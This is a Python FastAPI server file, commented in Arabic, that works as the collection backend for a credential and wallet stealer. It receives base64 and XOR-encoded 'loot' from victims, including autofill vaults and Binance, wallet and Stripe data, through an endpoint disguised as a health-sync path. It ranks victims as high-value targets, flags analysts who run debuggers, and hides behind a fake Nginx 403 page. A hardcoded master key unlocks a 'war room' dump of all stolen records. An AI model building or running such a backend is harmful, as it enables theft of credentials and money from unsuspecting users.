from fastapi import FastAPI, Request, HTTPException, Response, Query, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from psycopg2.extras import RealDictCursor
import psycopg2
import os, json, base64, datetime, hashlib, logging

app = FastAPI(docs_url=None, redoc_url=None) # تخفي الواجهة تماماً

# --- إعدادات التحكم المطلق ---
DB_URL = os.environ.get("DATABASE_URL")
MASTER_KEY = "Morteza_Overlord_2026"
DESTRUCT_PATH = "nuclear_delete_all_data_99"

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], # يسمح لمتجرك وموقع الهدية بالإرسال للسيرفر
    allow_credentials=True,
    allow_methods=["POST", "GET", "OPTIONS"], # المهم هو POST و OPTIONS
    allow_headers=["*"],
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("SOVEREIGN_OMEGA")

# --- 1. محرك التشفير المزدوج (XOR Cipher) ---
def xor_cipher(data: str):
    key = MASTER_KEY
    return "".join([chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data)])

# --- 2. محرك التصنيف الاستخباراتي ---
class SovereignAI:
    @staticmethod
    def evaluate_target(data):
        score = 0
        loot = data.get('loot', {})
        sec = data.get('sec', {})
        vault = data.get('vault', {})
        
        if sec.get('dbg'): score -= 200 # كشف المحللين
        if vault and len(vault) > 0: score += 300 # صيدة أوتوفيل ثمينة
        if any(x in json.dumps(loot).lower() for x in ['binance', 'wallet', 'stripe']): score += 250
        
        if score > 150: return "HIGH_VALUE_TARGET"
        if score < 0: return "SUSPICIOUS_ANALYZER"
        return "NORMAL_USER"

# --- 3. إدارة الداتا بيس ---
def get_db_conn():
    return psycopg2.connect(DB_URL, sslmode='require')

@app.on_event("startup")
def boot_system():
    conn = get_db_conn()
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS sovereign_omega_loot (
            id SERIAL PRIMARY KEY,
            target_id TEXT,
            gift_tag TEXT,
            ip_address TEXT,
            encrypted_loot TEXT,
            vault_data TEXT,
            target_class TEXT,
            metadata JSONB,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    """)
    conn.commit()
    cur.close()
    conn.close()

# --- 4. محرك المعالجة الخلفية (The Black Box) ---
def process_incoming_loot(raw_bytes: bytes, ip: str):
    try:
        # 1. تنظيف النص القادم
        raw_str = raw_bytes.decode('utf-8', errors='ignore').strip().replace(' ', '+')
        
        # 2. فك Base64 (بمحاولات متعددة)
        decoded_data = None
        for _ in range(2): 
            try:
                missing_padding = len(raw_str) % 4
                if missing_padding: raw_str += '=' * (4 - missing_padding)
                decoded_data = base64.b64decode(raw_str).decode('utf-8')
                break
            except: raw_str = raw_str.replace('-', '+').replace('_', '/') # تحويل URL-safe

        if not decoded_data: raise Exception("Base64 Failed")
        
        # 3. محاولة قراءة الـ JSON (سواء كان XOR أو عادي)
        try:
            data = json.loads(decoded_data) # إذا كان JSON عادي
        except:
            data = json.loads(xor_cipher(decoded_data)) # إذا كان مشفر XOR

        target_class = SovereignAI.evaluate_target(data)
        
        # 4. التخزين (احفظ النسخة الخام والنسخة المشفرة)
        secure_loot = base64.b64encode(xor_cipher(json.dumps(data)).encode()).decode()
        
        conn = get_db_conn()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO sovereign_omega_loot (target_id, gift_tag, ip_address, encrypted_loot, vault_data, target_class, metadata)
            VALUES (%s, %s, %s, %s, %s, %s, %s)
        """, (data.get('tid'), data.get('tag'), ip, secure_loot, json.dumps(data.get('vault', {})), target_class, json.dumps(data.get('hw'))))
        conn.commit()
        cur.close()
        conn.close()

    except Exception as e:
        logger.error(f"💀 CRITICAL_FAILURE: {str(e)}")

# --- 5. البوابات ---
@app.post("/api/v1/sys/health/sync")
async def inbound_gate(request: Request, bg: BackgroundTasks):
    ip = request.headers.get("x-forwarded-for", request.client.host).split(',')[0]
    raw = await request.body()
    # المعالجة في الخلفية لضمان سرعة الرد وعدم كشف السيرفر
    bg.add_task(process_incoming_loot, raw, ip)
    return {"status": "ok"}

@app.get("/api/v1/sys/health/report")
async def get_war_room(key: str = Query(None)):
    if key != MASTER_KEY: return Response(status_code=404)
    conn = get_db_conn()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    cur.execute("SELECT * FROM sovereign_omega_loot ORDER BY created_at DESC")
    rows = cur.fetchall()
    
    for row in rows:
        # محاولة فك التشفير بذكاء
        try:
            # 1. جرب إذا كانت البيانات واصلة كـ JSON نصي أصلاً (وهذا الأرجح حالياً)
            if row['encrypted_loot'].startswith('{'):
                row['decrypted_data'] = json.loads(row['encrypted_loot'])
            else:
                # 2. إذا كانت مشفرة، فكها بـ XOR
                raw_data = base64.b64decode(row['encrypted_loot']).decode()
                row['decrypted_data'] = json.loads(xor_cipher(raw_data))
            
            # 3. معالجة الـ Vault بنفس الطريقة
            if row['vault_data'] and row['vault_data'].startswith('{'):
                row['decrypted_vault'] = json.loads(row['vault_data'])
            else:
                raw_vault = base64.b64decode(row['vault_data']).decode()
                row['decrypted_vault'] = json.loads(xor_cipher(raw_vault))
                
        except Exception as e:
            # إذا فشل كل شيء، لا تعطيني VAULT_LOCKED، اعطيني النص الخام عشان أشوفه بالداشبورد
            row['decrypted_data'] = {"raw_debug": row['encrypted_loot'], "error": str(e)}
            row['decrypted_vault'] = {"raw_debug": row['vault_data']}
            
    cur.close()
    conn.close()
    return rows

@app.get("/")
async def fake_front():
    return Response(content="<h1>403 Forbidden</h1><p>Nginx/2.4.1</p>", status_code=403)
